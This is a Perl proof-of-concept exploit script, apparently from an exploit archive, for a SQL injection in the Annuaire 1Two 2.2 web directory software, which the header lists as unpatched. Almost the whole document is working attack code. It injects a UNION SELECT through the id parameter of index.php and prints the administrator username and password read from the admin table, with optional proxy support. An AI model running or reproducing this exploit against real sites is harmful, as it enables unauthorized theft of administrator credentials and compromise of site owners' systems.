Annuaire 1Two 2.2 Remote SQL Injection Exploit
==============================================



#!/usr/bin/perl
#
# Affected.scr..: Annuaire 1Two 2.2
# Poc.ID........: 09060902.txt
# Type..........: SQL Injection (without quote)
# Risk.level....: Medium
# Vendor.Status.: Unpatched
# Src.download..: http://www.1two.org/
# Poc.link......: acid-root.new.fr/poc/09060902.txt
# Credits.......: DarkFig
#
#
use LWP::UserAgent;
use HTTP::Request;
use Getopt::Long;
use strict;


print STDOUT "\n+", &#039;-&#039; x 53, "+\n";
print STDOUT "|    Annuaire 1Two 2.2 Remote SQL Injection Exploit   |\n";
print STDOUT &#039;+&#039;, &#039;-&#039; x 53, "+\n";

my($host,$path,$proxh,$proxu,$proxp,);
my $opt = GetOptions(
   &#039;host=s&#039;   =>  \$host,
   &#039;path=s&#039;   =>  \$path,
   &#039;proxh=s&#039;  =>  \$proxh,
   &#039;proxu=s&#039;  =>  \$proxu,
   &#039;proxp=s&#039;  =>  \$proxp);
   
if(!$host) {
    print STDOUT "| Usage: ./xx.pl --host=[www] --path=[/] [Options]    |\n";
    print STDOUT "| [Options] --proxh=[ip] --proxu=[user] --proxp=[pwd] |\n";
    print STDOUT &#039;+&#039;, &#039;-&#039; x 53, "+\n";
    exit(0);
}

if(!$path) {$path  = &#039;/&#039;;}
if($host  !~ /http/) {$host  = &#039;http://&#039;.$host;}
if($proxh !~ /http/ && $proxh != &#039;&#039;) {$proxh = &#039;http://&#039;.$proxh.&#039;/&#039;;}

my @fi = (&#039;username&#039;, &#039;password&#039;);
my $ur = $host.$path.&#039;index.php?id=&#039;;
my $ua = LWP::UserAgent->new();
   $ua->agent(&#039;Mozilla XD&#039;);
   $ua->timeout(30);
   $ua->proxy([&#039;http&#039;] => $proxh) if $proxh;

foreach(@fi) {
my $xx = $_;
my $re = HTTP::Request->new(GET =>  $ur."-1 UNION SELECT $xx FROM 1two_annuaire_admin");
   $re->proxy_authorization_basic($proxu, $proxp) if $proxp;
my $xd = $ua->request($re);
my $da = $xd->content;

if($da =~ /- (.*?)<\/title>/) {
      if($xx eq &#039;username&#039;) {
            print STDOUT " [+]User:";}
      if($xx eq &#039;password&#039;) {
            print STDOUT " [+]Passwd:";}
      print STDOUT " $1\n";
} else {
  print STDOUT "[!]Exploit failed\n";
}}
print STDOUT "+", &#039;-&#039; x 53, "+\n";
exit(0);




